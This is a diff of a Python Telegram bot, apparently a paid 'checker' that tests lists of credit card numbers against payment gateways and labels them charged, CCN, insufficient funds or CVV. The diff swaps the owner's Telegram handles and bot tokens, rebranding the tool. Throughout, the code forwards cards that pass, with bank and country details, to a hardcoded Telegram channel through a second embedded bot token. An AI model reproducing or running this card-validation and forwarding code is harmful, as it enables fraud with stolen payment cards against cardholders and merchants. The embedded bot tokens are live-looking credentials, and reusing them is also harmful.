@@ -12,9 +12,9 @@ from faker import Faker
 from multiprocessing import Process
 import threading
 stopuser = {}
-token = '7977702008:AAF5NvzjKdYhoV7Z2zo3L2XMQW6JFFABrdE'
+token = '7748128383:AAHuLf2Lw5E5PoiiV0QkjXXv_wupm4Fg3r4'
 bot=telebot.TeleBot(token,parse_mode="HTML")
-admin=6309252183
+admin=6835601128
 f = Faker()
 name = f.name()
 street = f.address()
@@ -55,8 +55,8 @@ def start(message):
 		if BL == '𝗙𝗥𝗘𝗘':	
 			keyboard = types.InlineKeyboardMarkup()
 			ahmedhusien = types.InlineKeyboardMarkup(row_width=1)
-			ahmed = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/VAN990")
-			contact_button = types.InlineKeyboardButton(text="✨ BUY  ✨", url="https://t.me/VAN_990")
+			ahmed = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/FJ0FF")
+			contact_button = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/mmqxq")
 			keyboard.add(contact_button, ahmed)
 			video_url = f'https://t.me/lqxqq/11'
 			bot.send_video(chat_id=message.chat.id, video=video_url, caption=f'''<b>مرحبا {name}
@@ -69,7 +69,7 @@ def start(message):
 اسبوع : 9 اسيا
 شهر : 18 اسيا
 
-للشراء عن طريق اسياسيل من هنا : @wwpww6
+للشراء عن طريق اسياسيل من هنا : @FJ0FF
 
 Subscription to the bot prices is now available: 
   
@@ -79,13 +79,13 @@ day : 2 USDT
 week : 6 USDT 
 Month : 12 USDT
 
-To purchase via USDT from here : @wwpww6
-User Bot : @wwpww6 {BL}</b>
+To purchase via USDT from here : @FJ0FF
+User Bot : @TomeCheckerBot {BL}</b>
 	''',reply_markup=keyboard)
 			return
 		keyboard = types.InlineKeyboardMarkup()
-		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥 ✨", url="https://t.me/wwpww6")
-		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇 ✨", url="https://t.me/reeetere")
+		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥 ✨", url="https://t.me/FJ0FF")
+		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇 ✨", url="https://t.me/mmqxq")
 		keyboard.add(contact_button, ahmed)
 		username = message.from_user.first_name
 		random_number = random.randint(33, 82)
@@ -147,8 +147,8 @@ def main(message):
 			with open('data.json', 'w') as json_file:
 				json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
 			keyboard = types.InlineKeyboardMarkup()
-			contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/wwpww6")
-			ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/reeetere")
+			contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/FJ0FF")
+			ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/mmqxq")
 			keyboard.add(contact_button, ahmed)
 			bot.send_message(chat_id=message.chat.id, text=f'''<b>مرحبا {name}
 عذرا هذا البوت ليس مجانا 
@@ -160,7 +160,7 @@ def main(message):
 اسبوع : 9 اسيا
 شهر : 18 اسيا
 
-للشراء عن طريق اسياسيل من هنا : @wwpww6
+للشراء عن طريق اسياسيل من هنا : @FJ0FF
 
 Subscription to the bot prices is now available: 
   
@@ -170,8 +170,8 @@ day : 2 USDT
 week : 6 USDT 
 Month : 12 USDT
 
-To purchase via USDT from here : @wwpww6
-User Bot : @wwpww6 {BL}</b>
+To purchase via USDT from here : @FJ0FF
+User Bot : @TomeCheckerBot {BL}</b>
 ''',reply_markup=keyboard)
 			return
 		with open('data.json', 'r') as file:
@@ -181,8 +181,8 @@ User Bot : @wwpww6 {BL}</b>
 			provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
 		except Exception as e:
 			keyboard = types.InlineKeyboardMarkup()
-			ahmed = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/wwpww6")
-			contact_button = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/wwpww6")
+			ahmed = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/FJ0FF")
+			contact_button = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/FJ0FF")
 			keyboard.add(contact_button, ahmed)
 			bot.send_message(chat_id=message.chat.id, text=f'''<b>مرحبا {name}
 عذرا هذا البوت ليس مجانا 
@@ -194,7 +194,7 @@ User Bot : @wwpww6 {BL}</b>
 اسبوع : 9 اسيا
 شهر : 18 اسيا
 
-للشراء عن طريق اسياسيل من هنا : @wwpww6
+للشراء عن طريق اسياسيل من هنا : @FJ0FF
 
 Subscription to the bot prices is now available: 
   
@@ -204,16 +204,16 @@ day : 2 USDT
 week : 6 USDT 
 Month : 12 USDT
 
-To purchase via USDT from here : @wwpww6
-User Bot : @wwpww6 {BL}</b>
+To purchase via USDT from here : @FJ0FF
+User Bot : @TomeCheckerBot {BL}</b>
 ''',reply_markup=keyboard)
 			return
 		current_time = datetime.now()
 		required_duration = timedelta(hours=0)
 		if current_time - provided_time > required_duration:
 			keyboard = types.InlineKeyboardMarkup()
-			ahmed = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/wwpww6")
-			contact_button = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/reeetere")
+			ahmed = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/FJ0FF")
+			contact_button = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/mmqxq")
 			keyboard.add(contact_button, ahmed)
 			bot.send_message(chat_id=message.chat.id, text=f'''<b>لا يمكنك استخدام البوت بسبب انتهاء اشتراكك يرجى التواصل مع المالك للتفعل مرى اخرى</b>
 		''',reply_markup=keyboard)
@@ -255,7 +255,7 @@ def menu_callback(call):
 			}
 				for cc in lino:
 					if stopuser[f'{id}']['status'] == 'stop':
-						bot.edit_message_text(chat_id=call.chat.id, message_id=ko, text='تم الايقاف بنجاح مالك البوت  @wwpww6')
+						bot.edit_message_text(chat_id=call.chat.id, message_id=ko, text='تم الايقاف بنجاح مالك البوت  @FJ0FF')
 						return
 					try:
 						data = requests.get('https://lookup.binlist.net/'+cc[:6]).json()
@@ -315,7 +315,7 @@ def menu_callback(call):
 					bot.edit_message_text(chat_id=call.message.chat.id, 
 					  message_id=call.message.message_id, 
 					  text=f'''رجائا انتظر ليتم فحص بطائقك على بوابة {gate}
-مالك البوت @wwpww6''', reply_markup=mes)
+مالك البوت @FJ0FF''', reply_markup=mes)
 
 					msg=f'''<b>𝑪𝑯𝑨𝑹𝑮𝑬 ✅
 			- - - - - - - - - - - - - - - - - - - - - - -
@@ -327,7 +327,7 @@ def menu_callback(call):
 ◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
 ◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
 - - - - - - - - - - - - - - - - - - - - - - -
-◆ 𝑩𝒀: @wwpww6
+◆ 𝑩𝒀: @FJ0FF
 ◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
 					msgc=f'''<b>𝑪𝑪𝑵 ☑️
 			- - - - - - - - - - - - - - - - - - - - - - -
@@ -339,7 +339,7 @@ def menu_callback(call):
 ◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
 ◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
 - - - - - - - - - - - - - - - - - - - - - - -
-◆ 𝑩𝒀: @wwpww6
+◆ 𝑩𝒀: @FJ0FF
 ◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
 					msgf=f'''<b>𝑰𝑵𝑺𝑼𝑭𝑭𝑰𝑪𝑰𝑬𝑵𝑻 𝑭𝑼𝑵𝑫𝑺 ☑️
 			- - - - - - - - - - - - - - - - - - - - - - -
@@ -351,10 +351,10 @@ def menu_callback(call):
 ◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
 ◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
 - - - - - - - - - - - - - - - - - - - - - - -
-◆ 𝑩𝒀: @wwpww6
+◆ 𝑩𝒀: @FJ0FF
 ◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
 					if 'success' in last:
-						tok = '7977702008:AAF5NvzjKdYhoV7Z2zo3L2XMQW6JFFABrdE'
+						tok = '7414864964:AAFf0oq3edv54z1yWyrE1UlWi2ML9YwjRHw'
 						acc =  '-889876060'
 						mg = f"""<b> 
 ❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
@@ -365,8 +365,8 @@ def menu_callback(call):
 ｢𝙱𝙰𝙽𝙺」➔ {bank}
 ｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
 ❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
-✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @reeetere
-✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @wwpww6  
+✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @JI_NS
+✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @FJ0FF  
 </b>"""
 						tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
 						tlg_params = {"parse_mode": "HTML"}
@@ -375,7 +375,7 @@ def menu_callback(call):
 						ch += 1
 						bot.send_message(call.from_user.id, msg)
 					elif "funds" in last:
-						tok = '7977702008:AAF5NvzjKdYhoV7Z2zo3L2XMQW6JFFABrdE'
+						tok = '7414864964:AAFf0oq3edv54z1yWyrE1UlWi2ML9YwjRHw'
 						acc =  '-889876060'
 						mg = f"""<b> 
 ❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
@@ -386,8 +386,8 @@ def menu_callback(call):
 ｢𝙱𝙰𝙽𝙺」➔ {bank}
 ｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
 ❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
-✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @reeetere
-✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @wwpww6  
+✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @JI_NS
+✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @FJ0FF  
 </b>"""
 						tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
 						tlg_params = {"parse_mode": "HTML"}
@@ -396,7 +396,7 @@ def menu_callback(call):
 						bot.send_message(call.from_user.id, msgf)
 						live+=1
 					elif "card's security" in last:
-						tok = '7977702008:AAF5NvzjKdYhoV7Z2zo3L2XMQW6JFFABrdE'
+						tok = '7414864964:AAFf0oq3edv54z1yWyrE1UlWi2ML9YwjRHw'
 						acc =  '-889876060'
 						mg = f"""<b> 
 ❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
@@ -407,8 +407,8 @@ def menu_callback(call):
 ｢𝙱𝙰𝙽𝙺」➔ {bank}
 ｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
 ❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
-✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @reeetere
-✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @wwpww6  
+✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @JI_NS
+✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @FJ0FF  
 </b>"""
 						tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
 						tlg_params = {"parse_mode": "HTML"}
@@ -424,7 +424,7 @@ def menu_callback(call):
 		stopuser[f'{id}']['status'] = 'start'
 		bot.edit_message_text(chat_id=call.message.chat.id, 
 					  message_id=call.message.message_id, 
-					  text='تم الانتهاء من الفحص مالك البوت @wwpww6')
+					  text='تم الانتهاء من الفحص مالك البوت @FJ0FF')
 	my_thread = threading.Thread(target=my_function)
 	my_thread.start()
 @bot.callback_query_handler(func=lambda call: call.data == 'br')
@@ -449,7 +449,7 @@ def menu_callback(call):
 			}
 				for cc in lino:
 					if stopuser[f'{id}']['status'] == 'stop':
-						bot.edit_message_text(chat_id=call.chat.id, message_id=ko, text='تم الايقاف بنجاح مالك البوت @wwpww6')
+						bot.edit_message_text(chat_id=call.chat.id, message_id=ko, text='تم الايقاف بنجاح مالك البوت @FJ0FF')
 						return
 					try:
 						data = requests.get('https://lookup.binlist.net/'+cc[:6]).json()
@@ -511,7 +511,7 @@ def menu_callback(call):
 					bot.edit_message_text(chat_id=call.message.chat.id, 
 					  message_id=call.message.message_id, 
 					  text=f'''رجائا انتظر ليتم فحص بطائقك على بوابة {gate}
-مالك البوت @wwpww6''', reply_markup=mes)
+مالك البوت @FJ0FF''', reply_markup=mes)
 					
 					msg=f'''<b>𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 ✅
 			
@@ -522,7 +522,7 @@ def menu_callback(call):
 𝘽𝙞𝙣 ➼ <code>{cc[:6]} - {card_type} - {brand}</code>
 𝙄𝙨𝙨𝙪𝙚𝙧 ➼ <code>{bank}</code>
 𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
-𝗕𝗼𝘁 𝗕𝘆: @wwpww6</b>'''
+𝗕𝗼𝘁 𝗕𝘆: @FJ0FF</b>'''
 					msgc=f'''<b>𝘾𝘾𝙉 ☑️
 			
 𝘾𝙖𝙧𝙙 ➼ <code>{cc}</code>
@@ -532,10 +532,10 @@ def menu_callback(call):
 𝘽𝙞𝙣 ➼ <code>{cc[:6]} - {card_type} - {brand}</code>
 𝙄𝙨𝙨𝙪𝙚𝙧 ➼ <code>{bank}</code>
 𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
-𝗕𝗼𝘁 𝗕𝘆: @wwpww6</b>'''
+𝗕𝗼𝘁 𝗕𝘆: @FJ0FF</b>'''
 
 					if "Funds" in last or 'Invalid postal' in last or 'avs' in last or 'added' in last or 'Duplicate' in last or 'Approved' in last:
-						tok = '7977702008:AAF5NvzjKdYhoV7Z2zo3L2XMQW6JFFABrdE'
+						tok = '7414864964:AAFf0oq3edv54z1yWyrE1UlWi2ML9YwjRHw'
 						acc =  '-889876060'
 						mg = f"""<b> 
 ❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
@@ -546,8 +546,8 @@ def menu_callback(call):
 ｢𝙱𝙰𝙽𝙺」➔ <code>{bank}</code>
 ｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
 ❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
-✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @reeetere
-✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @wwpww6  
+✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @JI_NS
+✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @FJ0FF  
 </b>"""
 						tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
 						tlg_params = {"parse_mode": "HTML"}
@@ -559,7 +559,7 @@ def menu_callback(call):
 						risk+=1
 						bot.send_message(call.from_user.id, risk)
 					elif 'CVV' in last:
-						tok = '7977702008:AAF5NvzjKdYhoV7Z2zo3L2XMQW6JFFABrdE'
+						tok = '7414864964:AAFf0oq3edv54z1yWyrE1UlWi2ML9YwjRHw'
 						acc =  '-889876060'
 						mg = f"""<b> 
 ❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
@@ -570,8 +570,8 @@ def menu_callback(call):
 ｢𝙱𝙰𝙽𝙺」➔ <code>{bank}</code>
 ｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
 ❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
-✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @reeetere
-✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @wwpww6  
+✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @JI_NS
+✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @FJ0FF  
 </b>"""
 						tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
 						tlg_params = {"parse_mode": "HTML"}
@@ -587,7 +587,7 @@ def menu_callback(call):
 		stopuser[f'{id}']['status'] = 'start'
 		bot.edit_message_text(chat_id=call.message.chat.id, 
 					  message_id=call.message.message_id, 
-					  text='تم الانتهاء من الفحص بنجاح مالك البوت @wwpww6')
+					  text='تم الانتهاء من الفحص بنجاح مالك البوت @FJ0FF')
 	my_thread = threading.Thread(target=my_function)
 	my_thread.start()
 @bot.message_handler(func=lambda message: message.text.lower().startswith('.au') or message.text.lower().startswith('/au'))
@@ -615,8 +615,8 @@ def respond_to_vbv(message):
 		BL='𝗙𝗥𝗘𝗘'
 	if BL == '𝗙𝗥𝗘𝗘':
 		keyboard = types.InlineKeyboardMarkup()
-		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="@wwpww6")
-		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/reeetere")
+		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="@FJ0FF")
+		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/mmqxq")
 		keyboard.add(contact_button, ahmed)
 		bot.send_message(chat_id=message.chat.id, text=f'''<b>مرحبا {name}
 عذرا هذا البوت ليس مجانا 
@@ -628,7 +628,7 @@ def respond_to_vbv(message):
 اسبوع : 9 اسيا
 شهر : 18 اسيا
 
-للشراء عن طريق اسياسيل من هنا : @wwpww6
+للشراء عن طريق اسياسيل من هنا : @FJ0FF
 
 Subscription to the bot prices is now available: 
   
@@ -638,8 +638,8 @@ day : 2 USDT
 week : 6 USDT 
 Month : 12 USDT
 
-To purchase via USDT from here : @wwpww6
-User Bot : @wwpww6 {BL}</b>
+To purchase via USDT from here : @FJ0FF
+User Bot : @TomeCheckerBot {BL}</b>
 ''',reply_markup=keyboard)
 		return
 	with open('data.json', 'r') as file:
@@ -649,8 +649,8 @@ User Bot : @wwpww6 {BL}</b>
 		provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
 	except Exception as e:
 		keyboard = types.InlineKeyboardMarkup()
-		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="@wwpww6")
-		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/reeetere")
+		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="@FJ0FF")
+		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/mmqxq")
 		keyboard.add(contact_button, ahmed)
 		bot.send_message(chat_id=message.chat.id, text=f'''<b>مرحبا {name}
 عذرا هذا البوت ليس مجانا 
@@ -662,7 +662,7 @@ User Bot : @wwpww6 {BL}</b>
 اسبوع : 9 اسيا
 شهر : 18 اسيا
 
-للشراء عن طريق اسياسيل من هنا : @wwpww6
+للشراء عن طريق اسياسيل من هنا : @FJ0FF
 
 Subscription to the bot prices is now available: 
   
@@ -672,16 +672,16 @@ day : 2 USDT
 week : 6 USDT 
 Month : 12 USDT
 
-To purchase via USDT from here : @wwpww6
-User Bot : @wwpww6 {BL}</b>
+To purchase via USDT from here : @FJ0FF
+User Bot : @TomeCheckerBot {BL}</b>
 ''',reply_markup=keyboard)
 		return
 	current_time = datetime.now()
 	required_duration = timedelta(hours=0)
 	if current_time - provided_time > required_duration:
 		keyboard = types.InlineKeyboardMarkup()
-		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="@wwpww6")
-		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/reeetere")
+		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="@FJ0FF")
+		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/mmqxq")
 		keyboard.add(contact_button, ahmed)
 		bot.send_message(chat_id=message.chat.id, text=f'''<b>لا يمكنك استخدام البوت بسبب انتهاء اشتراكك يرجى التواصل مع المالك للتفعل مرى اخرى</b>
 	''',reply_markup=keyboard)
@@ -754,7 +754,7 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 ◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
 ◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
 - - - - - - - - - - - - - - - - - - - - - - -
-◆ 𝑩𝒀: @wwpww6
+◆ 𝑩𝒀: @FJ0FF
 ◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
 	msgd=f'''<b>𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌
 			- - - - - - - - - - - - - - - - - - - - - - -
@@ -766,10 +766,10 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 ◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
 ◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
 - - - - - - - - - - - - - - - - - - - - - - -
-◆ 𝑩𝒀: @wwpww6
+◆ 𝑩𝒀: @FJ0FF
 ◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
 	if "Funds" in last or 'Invalid postal' in last or 'avs' in last or 'added' in last or 'Duplicate' in last or 'live' in last:
-		tok = '7977702008:AAF5NvzjKdYhoV7Z2zo3L2XMQW6JFFABrdE'
+		tok = '7414864964:AAFf0oq3edv54z1yWyrE1UlWi2ML9YwjRHw'
 		acc =  '-889876060'
 		mg = f"""<b> 
 ❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
@@ -780,12 +780,12 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 ｢𝙱𝙰𝙽𝙺」➔ <code>{bank}</code>
 ｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
 ❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
-✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @reeetere
-✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @wwpww6  
+✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @JI_NS
+✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @FJ0FF  
 </b>"""
 		tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
 		tlg_params = {"parse_mode": "HTML"}
-		tok = '7977702008:AAF5NvzjKdYhoV7Z2zo3L2XMQW6JFFABrdE'
+		tok = '7414864964:AAFf0oq3edv54z1yWyrE1UlWi2ML9YwjRHw'
 		acb =  '-889876060'
 		mag = f"""<b>
 {cc}|{street}|{city}|{postal}|{phone}|UNITED STATES
@@ -822,8 +822,8 @@ def respond_to_vbv(message):
 		BL='𝗙𝗥𝗘𝗘'
 	if BL == '𝗙𝗥𝗘𝗘':
 		keyboard = types.InlineKeyboardMarkup()
-		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/wwpww6")
-		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/reeetere")
+		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/FJ0FF")
+		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/mmqxq")
 		keyboard.add(contact_button, ahmed)
 		bot.send_message(chat_id=message.chat.id, text=f'''<b>مرحبا {name}
 عذرا هذا البوت ليس مجانا 
@@ -835,7 +835,7 @@ def respond_to_vbv(message):
 اسبوع : 9 اسيا
 شهر : 18 اسيا
 
-للشراء عن طريق اسياسيل من هنا : @wwpww6
+للشراء عن طريق اسياسيل من هنا : @FJ0FF
 
 Subscription to the bot prices is now available: 
   
@@ -845,8 +845,8 @@ day : 2 USDT
 week : 6 USDT 
 Month : 12 USDT
 
-To purchase via USDT from here : @wwpww6
-User Bot : @wwpww6 {BL}</b>
+To purchase via USDT from here : @FJ0FF
+User Bot : @TomeCheckerBot {BL}</b>
 ''',reply_markup=keyboard)
 		return
 	with open('data.json', 'r') as file:
@@ -856,8 +856,8 @@ User Bot : @wwpww6 {BL}</b>
 		provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
 	except Exception as e:
 		keyboard = types.InlineKeyboardMarkup()
-		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/wwpww6")
-		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/reeetere")
+		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/FJ0FF")
+		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/mmqxq")
 		keyboard.add(contact_button, ahmed)
 		bot.send_message(chat_id=message.chat.id, text=f'''<b>مرحبا {name}
 عذرا هذا البوت ليس مجانا 
@@ -869,7 +869,7 @@ User Bot : @wwpww6 {BL}</b>
 اسبوع : 9 اسيا
 شهر : 18 اسيا
 
-للشراء عن طريق اسياسيل من هنا : @wwpww6
+للشراء عن طريق اسياسيل من هنا : @FJ0FF
 
 Subscription to the bot prices is now available: 
   
@@ -879,8 +879,8 @@ day : 2 USDT
 week : 6 USDT 
 Month : 12 USDT
 
-To purchase via USDT from here : @wwpww6
-User Bot : @wwpww6 {BL}</b><b>مرحبا {name}
+To purchase via USDT from here : @FJ0FF
+User Bot : @TomeCheckerBot {BL}</b><b>مرحبا {name}
 عذرا هذا البوت ليس مجانا 
 
 
@@ -890,7 +890,7 @@ User Bot : @wwpww6 {BL}</b><b>مرحبا {name}
 اسبوع : 9 اسيا
 شهر : 18 اسيا
 
-للشراء عن طريق اسياسيل من هنا : @wwpww6
+للشراء عن طريق اسياسيل من هنا : @FJ0FF
 
 Subscription to the bot prices is now available: 
   
@@ -900,16 +900,16 @@ day : 2 USDT
 week : 6 USDT 
 Month : 12 USDT
 
-To purchase via USDT from here : @wwpww6
-User Bot : @wwpww6 {BL}</b>
+To purchase via USDT from here : @FJ0FF
+User Bot : @TomeCheckerBot {BL}</b>
